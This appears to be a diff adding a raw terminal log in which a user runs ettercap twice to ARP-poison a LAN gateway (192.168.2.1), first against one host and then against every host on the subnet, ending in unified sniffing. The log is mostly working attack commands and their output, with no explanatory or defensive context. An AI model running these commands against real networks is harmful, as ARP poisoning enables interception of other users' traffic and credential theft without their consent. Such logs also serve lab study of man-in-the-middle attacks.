@@ -1,0 +1,71 @@
+[ironix@Javed ~]$ sudo ettercap -i eth0 -T -q -M ARP /192.168.2.1/ /192.168.2.2/
+
+ettercap NG-0.7.3 copyright 2001-2004 ALoR & NaGA
+
+Dissector "dns" not supported (etter.conf line 70)
+Listening on eth0... (Ethernet)
+
+  eth0 ->	00:A0:D1:6E:50:4F       192.168.2.4     255.255.255.0
+
+SSL dissection needs a valid 'redir_command_on' script in the etter.conf file
+Privileges dropped to UID 65534 GID 65534...
+
+  28 plugins
+  39 protocol dissectors
+  53 ports monitored
+7587 mac vendor fingerprint
+1698 tcp OS fingerprint
+2183 known services
+
+Scanning for merged targets (2 hosts)...
+
+* |==================================================>| 100.00 %
+
+
+
+
+User requested a CTRL+C... (deprecated, next time use proper shutdown)
+
+[ironix@Javed ~]$ sudo ettercap -i eth0 -T -q -M ARP /192.168.2.1/ //
+
+ettercap NG-0.7.3 copyright 2001-2004 ALoR & NaGA
+
+Dissector "dns" not supported (etter.conf line 70)
+Listening on eth0... (Ethernet)
+
+  eth0 ->	00:A0:D1:6E:50:4F       192.168.2.4     255.255.255.0
+
+SSL dissection needs a valid 'redir_command_on' script in the etter.conf file
+Privileges dropped to UID 65534 GID 65534...
+
+  28 plugins
+  39 protocol dissectors
+  53 ports monitored
+7587 mac vendor fingerprint
+1698 tcp OS fingerprint
+2183 known services
+
+Randomizing 255 hosts for scanning...
+Scanning the whole netmask for 255 hosts...
+* |==================================================>| 100.00 %
+
+4 hosts added to the hosts list...
+
+ARP poisoning victims:
+
+ GROUP 1 : 192.168.2.1 00:23:DF:98:DA:10
+
+ GROUP 2 : ANY (all the hosts in the list)
+Starting Unified sniffing...
+
+
+Text only Interface activated...
+Hit 'h' for inline help
+
+
+
+
+User requested a CTRL+C... (deprecated, next time use proper shutdown)
+
+[ironix@Javed ~]$ 
+
